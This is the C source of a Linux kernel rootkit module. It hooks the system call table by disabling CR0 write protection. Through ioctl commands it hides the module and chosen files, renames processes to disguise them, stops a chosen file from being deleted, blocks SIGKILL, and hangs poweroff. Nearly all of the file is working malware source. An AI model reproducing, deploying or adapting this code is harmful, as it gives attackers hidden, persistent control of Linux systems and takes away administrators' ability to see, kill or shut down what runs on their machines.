#include <linux/sched.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/kprobes.h>
#include <linux/cdev.h>
#include <linux/kallsyms.h>
#include <linux/reboot.h>
#include <linux/namei.h>
#include <asm/syscall.h>
#include <asm/unistd.h>

#include "rootkit.h"

#define OURMODNAME "rootkit"

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int major;
struct cdev *kernel_cdev;

struct module *me = THIS_MODULE;

/* rootkit_hide_module */
static bool hide = false;
/* TO BE SOLVED: how if the other module is unloaded... */
struct list_head *prev = NULL;

/* poweroff */
bool poweroff = false;

/* kallsyms_lookup_name */
static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name",
};
typedef long (*lookup_sym_t)(const char *name);
lookup_sym_t kallsyms_lookup_name_sym = NULL;

/* sys_call_table */
sys_call_ptr_t *sys_call_table_sym = NULL;
sys_call_ptr_t orig_sys_call_table[__NR_syscalls] = {NULL};

/* getname */
typedef struct filename * (*getname_t)(const char __user *filename);
getname_t getname_sym = NULL;
/* rookit_hide_file */
char hfname[NAME_LEN];

/* rookit_rm_file */
char rm_name[NAME_LEN];

// LIST_HEAD(hnlist);
/* global hided file list */
/*
struct namelist {
	char name[NAME_LEN];
	struct list_head list;
};
*/
/* Having mutex is better, not thread-safe... */

static inline void __write_cr0(unsigned long cr0) 
{ 
    asm volatile("mov %0,%%cr0" : "+r"(cr0) : : "memory"); 
} 
 
static void enable_write_protection(void) 
{ 
    unsigned long cr0 = read_cr0(); 
    set_bit(16, &cr0); 
    __write_cr0(cr0); 
} 
 
static void disable_write_protection(void) 
{ 
    unsigned long cr0 = read_cr0(); 
    clear_bit(16, &cr0); 
    __write_cr0(cr0); 
}

static int rootkit_hide_module(void)
{	
	struct list_head *cur = &me->list;
	
	if (!hide) {
		__list_del_entry(cur);
	} else {
		list_add(cur, cur->prev);
	}
	
	hide = !hide;

	return 0;
}

/* fs/exec.c */
void __set_task_comm(struct task_struct *tsk, const char *buf, bool exec)
{
	task_lock(tsk);
	strlcpy(tsk->comm, buf, sizeof(tsk->comm));
	task_unlock(tsk);
}

static int rootkit_masq_proc(struct masq_proc_req *req)
{
	size_t len = req->len;
	int ret = 0;
	size_t i;
	
	struct masq_proc *procs, *cur;
	struct task_struct *p;
	size_t new_name_sz, orig_name_sz, task_name_sz;

	if (len < 0)
		return -EFAULT;
	
	if (len > 0) {
		procs = memdup_user((void __user *)req->list, len * (sizeof(struct masq_proc)));
		if (IS_ERR(procs)) {
			ret = PTR_ERR(procs);
			procs = NULL;
			goto out;
		}

		for (i = 0; i < len; i++) {
			cur = &procs[i];
			new_name_sz = strnlen(cur->new_name, MASQ_LEN);
			orig_name_sz = strnlen(cur->orig_name, MASQ_LEN);
			
			if (new_name_sz >= orig_name_sz)
				continue;

			for_each_process(p) {
				
				char task_name[sizeof(p->comm)];

				get_task_comm(task_name, p);
				task_name_sz = strnlen(task_name, sizeof(p->comm));

				if (orig_name_sz == task_name_sz && 
						!strncmp(task_name, cur->orig_name, orig_name_sz))
				{
					cur->new_name[sizeof(p->comm) - 1] = '\0';
					__set_task_comm(p, cur->new_name, false);
				}
			}
		}
	}

out:
	kfree(procs);
	return ret;
}

/* FIXME: hardcoded, overflow or not same place can bypass */
char power_cmd[0x30] = "/usr/sbin/poweroff";
char halt_cmd[0x30] = "/usr/sbin/halt";
char reboot_cmd[0x30] = "/usr/sbin/reboot";

asmlinkage long yet_another_execve(struct pt_regs *regs)
{
	char __user *argp = (char __user *)regs->di;
	struct filename *filename = NULL;
	sys_call_ptr_t execve_sym = NULL;
	
	if (poweroff)
		goto direct_call;

	if (getname_sym == NULL) {
		getname_sym = (getname_t)kallsyms_lookup_name_sym("getname");
		if (getname_sym == 0) {
			goto direct_call;
		}
	}
	filename = getname_sym(argp);

	if (orig_sys_call_table[__NR_unlinkat])
	{
	    /* 
	 	 * Power off will get fault, I guess process want to unmount the filesystem,
	 	 * then we get wrong, so if poweroff is execute, restore the syscall
	 	 */
		if (!strcmp(filename->name, power_cmd)
			|| !strcmp(filename->name, halt_cmd)
			|| !strcmp(filename->name, reboot_cmd))
		{
			poweroff = true;
			sys_call_table_sym[__NR_unlinkat] = orig_sys_call_table[__NR_unlinkat];
			orig_sys_call_table[__NR_unlinkat] = NULL;
			sys_call_table_sym[__NR_execve] = orig_sys_call_table[__NR_execve];
			orig_sys_call_table[__NR_execve] = NULL;
		}
	}

direct_call:
	execve_sym = orig_sys_call_table[__NR_execve];

	if (execve_sym == NULL) {
		pr_info(KERN_INFO "Failed to invoke execve()");
		return -ENOSYS;
	}

	return execve_sym(regs);

}

asmlinkage long yet_another_reboot(struct pt_regs *regs)
{
	sys_call_ptr_t reboot_sym = NULL;
	
	if (regs->dx == LINUX_REBOOT_CMD_POWER_OFF)
	{
		pr_info(KERN_INFO "reboot: Power down...");
		while(1) {}
	}

	reboot_sym = orig_sys_call_table[__NR_reboot];

	if (reboot_sym == NULL) {
		pr_info(KERN_INFO "Failed to invoke reboot()");
		return -ENOSYS;
	}

	return reboot_sym(regs);
}

asmlinkage long yet_another_kill(struct pt_regs *regs)
{

	sys_call_ptr_t kill_sym = NULL; 
	int sig = regs->si;
	
	if (sig == SIGKILL)
		return 0;
	
	kill_sym = orig_sys_call_table[__NR_kill];

	if (kill_sym == NULL) {
		pr_info(KERN_INFO "Failed to invoke kill()");
		return -ENOSYS;
	}
	
	return kill_sym(regs);
}

asmlinkage long yet_another_getdents64(struct pt_regs *regs)
{
	ssize_t bytes, orig_bytes;
	size_t offset;
	char *buf = NULL;

	sys_call_ptr_t getdents64_sym = NULL;
	void __user *argp;
	struct linux_dirent64 *current_dirent, *last_dirent;
	
	getdents64_sym = orig_sys_call_table[__NR_getdents64]; 
	if (getdents64_sym == NULL) {
		pr_info(KERN_INFO "Failed to invoke getdents64()");
		return -ENOSYS;
	}
	
	bytes = getdents64_sym(regs);
	if (bytes <= 0)
		goto out;
	
	argp = (void __user *)regs->si;
	buf = (char *)kmalloc(bytes, GFP_KERNEL);
	if (!buf)
		goto out;
	
	if (copy_from_user(buf, argp, bytes)) {
		pr_info(KERN_INFO "unable to obtain reg x1 context from user");
		goto out;
	}
	
	offset = 0;
	orig_bytes = bytes;
	last_dirent = NULL;
	while (offset < bytes) {
		
		current_dirent = (struct linux_dirent64 *)&buf[offset];
		
		if(!strcmp(hfname, current_dirent->d_name)) {
			bytes -= current_dirent->d_reclen;
			if (last_dirent != NULL) {
				last_dirent->d_off = current_dirent->d_off; 
			}
			if (bytes - offset > 0) {
				memmove((void *)current_dirent,
						(void *)current_dirent + current_dirent->d_reclen,
						bytes - offset);
			}
			break;

		}
			
		offset += current_dirent->d_reclen;
		last_dirent = current_dirent;
	}

	if (bytes < orig_bytes) {
		/* rewrite the forgery context back */
		if(copy_to_user(argp, buf, bytes)) {
			pr_info(KERN_INFO "unable to write context to user");
			goto out;
		}
	}

out:
	kfree(buf);
	return bytes;
}

asmlinkage long yet_another_unlinkat(struct pt_regs *regs)
{
	sys_call_ptr_t unlinkat_sym = NULL;
	sys_call_ptr_t renameat2_sym = NULL;
	int res;
	struct path path;	
	struct filename *filename = NULL;
	void __user *argp = NULL;
   	unsigned char *iname = NULL;
	struct pt_regs saved_registers = {};
	char dot[2] = ".";
	
	argp = (void __user *)regs->si;
	/* dfd, filename, lookup_flags, &path) */
	res = user_path_at((int)regs->di, argp, 0, &path);
	if (res)
		goto direct_call;
	
	iname = path.dentry->d_iname;
	if (iname && !strcmp(iname, rm_name))
	{
		if (getname_sym == NULL) {
			getname_sym = (getname_t)kallsyms_lookup_name_sym("getname");
			if (getname_sym == 0) {
				goto direct_call;
			}
		}	
		filename = getname_sym((char __user *)argp);

		if (sys_call_table_sym[__NR_renameat2] == NULL) {
			goto direct_call;
		}
		renameat2_sym = sys_call_table_sym[__NR_renameat2];
	
		memcpy(&saved_registers, regs, sizeof(struct pt_regs));
		regs->dx = regs->di;
		regs->cx = regs->si + 1;
		regs->r8 = RENAME_NOREPLACE;
		if(renameat2_sym(regs)) {
			goto restore_register;
		}
		// printk(KERN_INFO "replace: %s\n", path.dentry->d_iname);
		regs->si = regs->cx;
		if(copy_to_user(argp, &dot, 1)) {
			goto restore_register;
		}
		regs->cx = regs->cx - 1;
		if(renameat2_sym(regs)) {
			saved_registers.si = regs->si;
			goto restore_register;
		}
		return 0;
	} else {
		goto direct_call;
	}

restore_register:
	// printk(KERN_INFO "restore_register\n");
	memcpy(regs, &saved_registers, sizeof(struct pt_regs));
direct_call:
	// printk(KERN_INFO "direct call\n");
	unlinkat_sym = orig_sys_call_table[__NR_unlinkat];
	if (unlinkat_sym == NULL) {
		pr_info(KERN_INFO "Failed to invoke unlinkat()");
		return -ENOSYS;
	}
		
	return unlinkat_sym(regs);
}

static int overwrite_syscall_table(int sysno, sys_call_ptr_t new)
{

	if (!kallsyms_lookup_name_sym)
		return -EFAULT;

	if (sys_call_table_sym == NULL) {
		sys_call_table_sym = (sys_call_ptr_t *)kallsyms_lookup_name_sym("sys_call_table");
		if (sys_call_table_sym == 0) {
			pr_info(KERN_INFO "unable to resolve sys_call_table symbol");
			return -EFAULT;	
		}
	}


	disable_write_protection(); 
	if (orig_sys_call_table[sysno] == NULL) {
		orig_sys_call_table[sysno] = sys_call_table_sym[sysno];
		sys_call_table_sym[sysno] = new;
	}
	enable_write_protection(); 

	return 0;
}	

static int rootkit_hide_file(struct hided_file *hf)
{
	int ret = 0;

	ret = overwrite_syscall_table(__NR_getdents64, (sys_call_ptr_t)yet_another_getdents64);
	if (ret < 0)
		goto out;

	memset(hfname, 0, sizeof(char) * NAME_LEN);

	strncpy(hfname, hf->name, NAME_LEN - 1);
out:
	return ret;
}

static int rootkit_remove2rename(struct rm_file *rf)
{
	int ret = -EFAULT;

	ret = overwrite_syscall_table(__NR_unlinkat, (sys_call_ptr_t)yet_another_unlinkat);
	if (ret < 0)
		goto out;
	
	memset(rm_name, 0, sizeof(char) * NAME_LEN);
	strncpy(rm_name, rf->rm_name, NAME_LEN - 1);

	return 0;
out:
	return ret;
}

static int get_kallsyms_addr(void)
{
	int ret = 0;

	if (kallsyms_lookup_name_sym)
		return ret;

	ret = register_kprobe(&kp);
	if (ret < 0) {
		pr_info(KERN_INFO "unable to register kprobe");
		return ret;
	}

	kallsyms_lookup_name_sym = (lookup_sym_t)kp.addr;
	unregister_kprobe(&kp);

	return ret;
}

static void rootkit_unhook_syscall(void)
{
	int i;
	
	if (!sys_call_table_sym)
		return;

	for(i = 0; i < __NR_syscalls; i++) {
		if (orig_sys_call_table[i]) {
			sys_call_table_sym[i] = orig_sys_call_table[i];
			orig_sys_call_table[i] = NULL;
		}
	}
}

/* fops */
static int rootkit_open(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
			  unsigned long arg)
{
	long ret, err;
	void __user *argp = (void __user *)arg;

	if (get_kallsyms_addr() < 0) {
		pr_info(KERN_INFO "unable to resolve function kallsyms_lookup_name");
	}
	/* specifially hook execve (or use kprobe), regardless success or not */
	overwrite_syscall_table(__NR_execve, (sys_call_ptr_t)yet_another_execve);

	switch (ioctl) {
	case IOCTL_MOD_HOOK:
	
		err = overwrite_syscall_table(__NR_reboot, (sys_call_ptr_t)yet_another_reboot);
		ret = (err < 0)? -EFAULT : 0;

		err = overwrite_syscall_table(__NR_kill, (sys_call_ptr_t)yet_another_kill);		
		ret = (ret < 0)? ret : err;

		break;
	case IOCTL_MOD_HIDE: {
		ret = rootkit_hide_module();
		break;
						 } 
	case IOCTL_MOD_MASQ: {
		struct masq_proc_req req = {};
		if (copy_from_user(&req, argp, sizeof(struct masq_proc_req))) {
			pr_info(KERN_INFO "unable to obtain arg from user");
			return -EFAULT;
		}
		ret = rootkit_masq_proc(&req);
		break;
	}
	case IOCTL_FILE_HIDE: {
		struct hided_file hf = {};
		if (copy_from_user(&hf, argp, sizeof(struct hided_file))) {
			pr_info(KERN_INFO "unable to obtain arg from user");
			return -EFAULT;	
		}
		ret = rootkit_hide_file(&hf);
		break;
	}
	case IOCTL_FILE_RMRN: {
		struct rm_file rf = {};
		if (copy_from_user(&rf, argp, sizeof(struct rm_file))) {
			pr_info(KERN_INFO "unable to obtain arg from user");
			return -EFAULT;	
		}
		ret = rootkit_remove2rename(&rf);
		break;
	}
	default:
		ret = -EINVAL;
	}
	printk(KERN_INFO "%s\n", __func__);
	return ret;
}

struct file_operations fops = {
	open: rootkit_open,
	unlocked_ioctl: rootkit_ioctl,
	release: rootkit_release,
	owner: THIS_MODULE
};

static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no, dev;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	printk("The major number for your device is %d\n", major);
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0) {
		pr_info(KERN_INFO "unable to allocate cdev");
		return ret;
	}

	return 0;
}

static void __exit rootkit_exit(void)
{
	rootkit_unhook_syscall();
	pr_info("%s: removed\n", OURMODNAME);
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
